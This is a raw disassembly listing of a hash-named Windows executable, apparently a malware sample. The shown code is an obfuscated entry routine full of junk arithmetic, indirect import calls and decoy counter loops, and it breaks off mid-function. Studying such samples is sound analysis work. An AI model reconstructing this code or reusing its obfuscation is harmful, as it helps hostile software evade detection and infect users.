
a561491aad1211a92f9d6acc80211d37599c0db0511377bbd08ec5e77169e72f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
